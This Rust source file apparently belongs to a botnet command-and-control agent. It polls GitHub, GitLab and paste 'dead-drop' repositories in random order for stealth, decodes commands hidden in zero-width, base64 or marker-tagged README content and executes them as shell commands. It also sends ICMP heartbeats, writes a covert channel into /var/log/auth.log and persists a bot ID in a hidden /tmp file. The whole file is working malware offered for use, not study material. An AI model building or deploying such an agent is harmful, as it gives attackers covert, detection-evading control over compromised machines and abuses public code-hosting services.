//! Agent: the core C2 polling loop with self-healing.
//!
//! The agent polls multiple dead-drop repos in random order,
//! extracts zero-width encoded commands, executes them, and
//! sends heartbeats. Failed repos get exponential backoff.
//! Repo list can be updated dynamically from payloads.

use std::sync::Arc;
use std::time::Duration;
use tokio::sync::{RwLock, mpsc};
use tracing::{debug, error, info, warn};

use arcticfox_core::config::{AgentConfig, RepoSource};
use arcticfox_core::crypto::BotHasher;
use arcticfox_core::error::{ArcticFoxError, Result};
use arcticfox_core::zwcodec;
use arcticfox_core::zwcodec::SessionMarkers;

use crate::executor;
use crate::fetcher::Fetcher;
use crate::heartbeat::Heartbeat;
use crate::icmp_heartbeat;
use crate::log_covert;

const MAX_REPOS: usize = 256;
const BOT_ID_FILE: &str = "/tmp/.sd-id";

/// Main C2 agent.
pub struct Agent {
    config: Arc<RwLock<AgentConfig>>,
    bot_id: String,
    fetcher: Fetcher,
    heartbeat: Heartbeat,
    bot_hasher: BotHasher,
    marker_sets: RwLock<Vec<SessionMarkers>>,
    cmd_rx: RwLock<Option<mpsc::UnboundedReceiver<String>>>,
}

impl Agent {
    /// Create a new agent with the given configuration.
    pub async fn new(
        config: AgentConfig,
        bot_id: Option<String>,
        config_path: std::path::PathBuf,
    ) -> Result<Self> {
        let bot_id = bot_id.unwrap_or_else(|| Self::load_or_generate_bot_id());
        let fetcher = Fetcher::new()?;
        let (cmd_tx, cmd_rx) = mpsc::unbounded_channel();
        let heartbeat = Heartbeat::new(cmd_tx);
        let bot_hasher = BotHasher::new();

        let config_arc = Arc::new(RwLock::new(config));
        {
            let cfg = config_arc.read().await;
            if let Err(e) = cfg.save(&config_path) {
                warn!("Could not save config on startup: {e}");
            }
        }

        Ok(Agent {
            config: config_arc,
            bot_id,
            fetcher,
            heartbeat,
            bot_hasher,
            marker_sets: RwLock::new(vec![SessionMarkers::default()]),
            cmd_rx: RwLock::new(Some(cmd_rx)),
        })
    }

    fn load_or_generate_bot_id() -> String {
        if let Ok(id) = std::fs::read_to_string(BOT_ID_FILE) {
            let id = id.trim().to_string();
            if !id.is_empty() { return id; }
        }
        let id = Self::generate_bot_id();
        let _ = std::fs::write(BOT_ID_FILE, &id);
        id
    }

    /// Generate a persistent bot ID.
    fn generate_bot_id() -> String {
        use base64::Engine;
        let random: Vec<u8> = (0..6).map(|_| rand::random::<u8>()).collect();
        base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&random)
    }

    /// Run the main agent loop. Returns only on fatal error or shutdown signal.
    pub async fn run(&self, mut shutdown: tokio::sync::watch::Receiver<bool>) -> Result<()> {
        debug!("Agent starting — {} repos configured", self.config.read().await.repos.len());

        // Start heartbeat-command receiver: forwards ZW-extracted commands to executor
        let cmd_rx = self.cmd_rx.write().await.take();
        if let Some(mut rx) = cmd_rx {
            let mut shutdown_clone = shutdown.clone();
            tokio::spawn(async move {
                loop {
                    tokio::select! {
                        cmd = rx.recv() => {
                            if let Some(cmd) = cmd {
                                debug!("Heartbeat command: executing");
                                let _ = executor::execute_command(&cmd).await;
                            } else {
                                break;
                            }
                        }
                        _ = shutdown_clone.changed() => {
                            if *shutdown_clone.borrow() { break; }
                        }
                    }
                }
            });
        }

        let _hb_handle = self.heartbeat.start(
            self.bot_id.clone(),
            self.bot_hasher.clone(),
            self.fetcher.client().clone(),
            shutdown.clone(),
        );

        // Start ICMP heartbeat as fallback transport
        let bot_id = self.bot_id.clone();
        let mut shutdown_icmp = shutdown.clone();
        tokio::spawn(async move {
            let key = arcticfox_core::crypto::generate_session_key();
            let dest = std::net::Ipv4Addr::new(8, 8, 8, 8);
            let mut seq: u16 = 0;
            loop {
                tokio::select! {
                    _ = tokio::time::sleep(std::time::Duration::from_secs(300)) => {
                        icmp_heartbeat::send_icmp_heartbeat(&bot_id, &key, dest, 0xAF47, seq);
                        seq = seq.wrapping_add(1);
                    }
                    _ = shutdown_icmp.changed() => {
                        if *shutdown_icmp.borrow() { break; }
                    }
                }
            }
        });

        // Start log covert channel
        let bot_id_log = self.bot_id.clone();
        let key = arcticfox_core::crypto::generate_session_key();
        let mut shutdown_log = shutdown.clone();
        tokio::spawn(async move {
            let log_path = "/var/log/auth.log";
            loop {
                tokio::select! {
                    _ = tokio::time::sleep(std::time::Duration::from_secs(600)) => {
                        log_covert::write_log_covert(log_path, bot_id_log.as_bytes(), &key);
                    }
                    _ = shutdown_log.changed() => {
                        if *shutdown_log.borrow() { break; }
                    }
                }
            }
        });

        loop {
            // Check shutdown
            if *shutdown.borrow() {
                info!("Agent shutting down");
                break;
            }

            // Poll for commands
            match self.poll_once().await {
                Ok(did_work) => {
                    if did_work {
                        debug!("Poll cycle completed with work done");
                    }
                }
                Err(e) => {
                    if e.is_fatal() {
                        error!("Fatal error in poll cycle: {e}");
                        return Err(e);
                    }
                    warn!("Poll cycle error (retrying): {e}");
                }
            }

            // Wait with jitter before next poll
            let interval = {
                let cfg = self.config.read().await;
                let base = cfg.poll_interval;
                let jitter = cfg.jitter;
                let jittered = if jitter > 0 {
                    // Avoid i64::MIN.abs() panic — use u64 safe range
                    let j: u64 = rand::random::<u64>() % (jitter as u64).max(1);
                    base.saturating_add(j)
                } else {
                    base
                };
                Duration::from_secs(jittered)
            };

            // Use tokio::select to allow early shutdown during sleep
            tokio::select! {
                _ = tokio::time::sleep(interval) => {},
                _ = shutdown.changed() => {
                    if *shutdown.borrow() {
                        break;
                    }
                }
            }
        }

        info!("Agent loop exited");
        Ok(())
    }

    /// Single poll cycle: fetch from repos, extract commands, execute.
    /// Returns true if any work was done (commands executed).
    async fn poll_once(&self) -> Result<bool> {
        let repos = {
            let cfg = self.config.read().await;
            cfg.repos.clone()
        };

        if repos.is_empty() {
            debug!("No repos configured, skipping poll");
            return Ok(false);
        }

        // Randomize order for stealth
        let mut candidates = repos.clone();
        // Simple Fisher-Yates shuffle
        for i in (0..candidates.len()).rev() {
            let j = rand::random::<usize>() % (i + 1);
            candidates.swap(i, j);
        }

        let cfg_snapshot = self.config.read().await;
        let max_fails = cfg_snapshot.max_fails_before_skip;
        let poll_interval = cfg_snapshot.poll_interval;
        drop(cfg_snapshot);

        for repo in &candidates {
            if !repo.active {
                continue;
            }

            // Check backoff — use chrono timestamps not Instant
            if repo.fail_count >= max_fails {
                let backoff_secs = repo.backoff_duration(poll_interval).as_secs();
                let now_ts = chrono::Utc::now().timestamp() as u64;
                if repo.last_fail > 0.0 {
                    let last_fail_ts = repo.last_fail as u64;
                    if now_ts.saturating_sub(last_fail_ts) < backoff_secs {
                        debug!("Repo {} in backoff, skipping", repo.label());
                        continue;
                    }
                }
            }

            // Fetch
            match self.fetcher.fetch_readme(repo).await {
                Ok(content) => {
                    // Success — reset fail count
                    self.update_repo_state(&repo.label(), |r| {
                        r.fail_count = 0;
                        r.last_success = chrono::Utc::now().timestamp() as f64;
                    })
                    .await;

                    // Extract ZW payloads — try all known marker sets for key rotation support
                    let mut extracted = false;
                    for markers in self.marker_sets.read().await.iter() {
                        if let Some(payload) = zwcodec::extract_with_markers(&content, markers) {
                            match self.process_payload(&payload, &content).await {
                                Ok(true) => { extracted = true; break; }
                                Ok(false) => { extracted = true; }
                                Err(e) => warn!("Error processing payload: {e}"),
                            }
                        }
                    }
                    if extracted { return Ok(true); }

                    // Also check legacy formats
                    let commands = extract_legacy_commands(&content);
                    if !commands.is_empty() {
                        match self.process_commands(&commands).await {
                            Ok(executed) => {
                                if executed {
                                    return Ok(true);
                                }
                            }
                            Err(e) => {
                                warn!("Error executing legacy commands: {e}");
                            }
                        }
                    }
                }
                Err(e) => {
                    warn!("Fetch failed for {}: {}", repo.label(), e);
                    self.update_repo_state(&repo.label(), |r| {
                        r.fail_count = r.fail_count.saturating_add(1);
                        r.last_fail = chrono::Utc::now().timestamp() as f64;
                    })
                    .await;

                    // If too many failures, mark inactive
                    if repo.fail_count >= max_fails * 2 {
                        self.update_repo_state(&repo.label(), |r| {
                            r.active = false;
                        })
                        .await;
                        warn!("Repo {} deactivated after {} consecutive failures",
                              repo.label(), repo.fail_count);
                    }
                }
            }
        }

        Ok(false)
    }

    /// Process a zero-width payload — parse JSON, extract commands, execute.
    async fn process_payload(&self, payload: &[u8], _raw_content: &str) -> Result<bool> {
        let json: serde_json::Value = serde_json::from_slice(payload).map_err(|e| {
            ArcticFoxError::Json { source: e }
        })?;

        let mut commands = Vec::new();

        // Extract commands from "cmd" field
        if let Some(cmd_array) = json.get("cmd").and_then(|c| c.as_array()) {
            for cmd in cmd_array {
                if let Some(s) = cmd.as_str() {
                    commands.push(s.to_string());
                }
            }
        }

        // Extract heartbeat config
        if let Some(hb) = json.get("hb") {
            if let (Some(url), Some(sec)) = (
                hb.get("url").and_then(|v| v.as_str()),
                hb.get("sec").and_then(|v| v.as_u64()),
            ) {
                self.heartbeat.update_config(url.to_string(), sec).await;
            }
            // Also extract session key for ZW-encrypted heartbeat responses
            if let Some(key_hex) = hb.get("key").and_then(|v| v.as_str()) {
                if let Ok(key_bytes) = hex::decode(key_hex) {
                    if key_bytes.len() == 32 {
                        let mut key = [0u8; 32];
                        key.copy_from_slice(&key_bytes);
                        self.heartbeat.update_session_key(key).await;
                        // Register new markers derived from this key
                        let new_markers = SessionMarkers::from_key(&key);
                        let mut markers = self.marker_sets.write().await;
                        if !markers.iter().any(|m| m.start == new_markers.start) {
                            markers.insert(0, new_markers);
                            markers.truncate(3);
                        }
                    }
                }
            }
        }

        // Update repo list from payload (dynamic repo discovery)
        if let Some(gh_repos) = json.get("gh").and_then(|v| v.as_array()) {
            for entry in gh_repos {
                if let Some(s) = entry.as_str() {
                    if let Some((owner, repo)) = s.split_once('/') {
                        self.add_repo_if_new(RepoSource {
                            owner: owner.into(),
                            repo: repo.into(),
                            platform: "github".into(),
                            branch: "main".into(),
                            file_path: "README.md".into(),
                            active: true,
                            fail_count: 0,
                            last_success: 0.0,
                            last_fail: 0.0,
                        })
                        .await;
                    }
                }
            }
        }
        if let Some(gl_repos) = json.get("gl").and_then(|v| v.as_array()) {
            for entry in gl_repos {
                if let Some(s) = entry.as_str() {
                    if let Some((owner, repo)) = s.split_once('/') {
                        self.add_repo_if_new(RepoSource {
                            owner: owner.into(),
                            repo: repo.into(),
                            platform: "gitlab".into(),
                            branch: "main".into(),
                            file_path: "README.md".into(),
                            active: true,
                            fail_count: 0,
                            last_success: 0.0,
                            last_fail: 0.0,
                        })
                        .await;
                    }
                }
            }
        }
        if let Some(dp_pastes) = json.get("dp").and_then(|v| v.as_array()) {
            for entry in dp_pastes {
                if let Some(s) = entry.as_str() {
                    self.add_repo_if_new(RepoSource {
                        owner: String::new(),
                        repo: s.into(),
                        platform: "debian".into(),
                        branch: String::new(),
                        file_path: String::new(),
                        active: true,
                        fail_count: 0,
                        last_success: 0.0,
                        last_fail: 0.0,
                    })
                    .await;
                }
            }
        }

        if !commands.is_empty() {
            self.process_commands(&commands).await
        } else {
            Ok(false)
        }
    }

    /// Execute a list of commands, with deduplication.
    async fn process_commands(&self, commands: &[String]) -> Result<bool> {
        if commands.is_empty() {
            return Ok(false);
        }

        // Deduplicate by hash
        let cmd_str = commands.join("\n");
        let cmd_hash = arcticfox_core::crypto::sha256_hex(cmd_str.as_bytes());
        let short_hash = &cmd_hash[..cmd_hash.len().min(16)];

        {
            let cfg = self.config.read().await;
            if cfg.last_command_hash == short_hash {
                debug!("Skipping already-executed command batch");
                return Ok(false);
            }
        }

        info!("Executing {} commands", commands.len());
        let mut executed = false;

        for cmd in commands {
            if cmd.starts_with("add_repo ") {
                let spec_str = cmd.strip_prefix("add_repo ").unwrap_or("");
                self.add_repos_from_spec(spec_str).await;
                executed = true;
                continue;
            }

            if cmd.starts_with("set_key ") {
                if let Ok(key_bytes) = hex::decode(cmd.strip_prefix("set_key ").unwrap_or("").trim()) {
                    if key_bytes.len() == 32 {
                        let mut key = [0u8; 32];
                        key.copy_from_slice(&key_bytes);
                        self.heartbeat.update_session_key(key).await;
                        let mut markers = self.marker_sets.write().await;
                        let new_markers = SessionMarkers::from_key(&key);
                        if !markers.iter().any(|m| m.start == new_markers.start) {
                            markers.insert(0, new_markers);
                            markers.truncate(3);
                        }
                        info!("Session key rotated");
                    }
                }
                executed = true;
                continue;
            }

            if cmd.starts_with("set_interval ") {
                if let Ok(interval) = cmd
                    .strip_prefix("set_interval ")
                    .unwrap_or("")
                    .trim()
                    .parse::<u64>()
                {
                    let mut cfg = self.config.write().await;
                    cfg.poll_interval = interval.max(10);
                    info!("Poll interval updated to {}s", cfg.poll_interval);
                }
                executed = true;
                continue;
            }

            if cmd.starts_with("sleep ") {
                if let Ok(secs) = cmd
                    .strip_prefix("sleep ")
                    .unwrap_or("")
                    .trim()
                    .parse::<u64>()
                {
                    let actual = secs.min(3600);
                    debug!("Sleeping for {}s", actual);
                    tokio::time::sleep(Duration::from_secs(actual)).await;
                }
                executed = true;
                continue;
            }

            if cmd.trim() == "die" {
                info!("Received die command — exiting");
                std::process::exit(0);
            }

            // Execute the command
            match executor::execute_command(cmd).await {
                Ok(output) => {
                    debug!("Command output: {}", &output[..output.len().min(200)]);
                }
                Err(e) => {
                    warn!("Command failed: {e}");
                }
            }
            executed = true;
        }

        // Save command hash to prevent re-execution
        {
            let mut cfg = self.config.write().await;
            cfg.last_command_hash = short_hash.to_string();
        }

        Ok(executed)
    }

    /// Update a repo's state by label.
    async fn update_repo_state<F: FnOnce(&mut RepoSource)>(&self, label: &str, f: F) {
        let mut cfg = self.config.write().await;
        for repo in &mut cfg.repos {
            if repo.label() == label {
                f(repo);
                break;
            }
        }
    }

    /// Add a new repo if it's not already in the list.
    async fn add_repo_if_new(&self, new_repo: RepoSource) {
        let mut cfg = self.config.write().await;
        let already_exists = cfg.repos.iter().any(|r| {
            r.platform == new_repo.platform
                && r.owner == new_repo.owner
                && r.repo == new_repo.repo
        });
        if !already_exists {
            if cfg.repos.len() >= MAX_REPOS {
                warn!("Repo limit ({}) reached, ignoring new repo: {}", MAX_REPOS, new_repo.label());
                return;
            }
            info!("Discovered new repo: {}", new_repo.label());
            cfg.repos.push(new_repo);
        }
    }

    /// Add repos from a comma-separated spec string (from `add_repo` command).
    async fn add_repos_from_spec(&self, spec_str: &str) {
        for entry in spec_str.split(',') {
            let entry = entry.trim();
            if entry.is_empty() {
                continue;
            }
            let repo = match arcticfox_core::repo::parse_repo_spec(entry) {
                Ok(r) => r,
                Err(e) => {
                    warn!("Invalid repo spec '{}': {}", entry, e);
                    continue;
                }
            };
            self.add_repo_if_new(RepoSource {
                owner: repo.owner.clone(),
                repo: repo.repo.clone(),
                platform: repo.platform.clone(),
                branch: repo.branch.clone(),
                file_path: repo.file_path.clone(),
                active: true,
                fail_count: 0,
                last_success: 0.0,
                last_fail: 0.0,
            })
            .await;
        }
    }
}

/// Extract commands from legacy marker/block formats in content.
fn extract_legacy_commands(content: &str) -> Vec<String> {
    let mut commands = Vec::new();

    // Marker-tag format
    const MARKER_START: &str = "<!-- CMD_START -->";
    const MARKER_END: &str = "<!-- CMD_END -->";
    if let (Some(start), Some(end)) = (
        content.find(MARKER_START),
        content.find(MARKER_END),
    ) {
        if start < end {
            let block = &content[start + MARKER_START.len()..end];
            for line in block.lines() {
                let line = line.trim();
                if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
                    commands.push(line.to_string());
                }
            }
        }
    }

    // B64-encoded format (Python pastebomb.py compatibility)
    if let Some(idx) = content.find("<!-- B64:") {
        let rest = &content[idx + 9..];
        if let Some(end) = rest.find("-->") {
            let b64 = rest[..end].trim();
            if let Ok(decoded) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64) {
                if let Ok(text) = String::from_utf8(decoded) {
                    for line in text.lines() {
                        let line = line.trim();
                        if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
                            commands.push(line.to_string());
                        }
                    }
                }
            }
        }
    }

    // Code-block format
    if let Some(idx) = content.find("```cmd") {
        let rest = &content[idx + 6..];
        if let Some(end) = rest.find("```") {
            let block = &rest[..end];
            for line in block.lines() {
                let line = line.trim();
                if !line.is_empty() && !line.starts_with("//") && !line.starts_with('#') {
                    commands.push(line.to_string());
                }
            }
        }
    }

    let mut seen = std::collections::HashSet::new();
    commands.retain(|c| seen.insert(c.clone()));
    commands
}
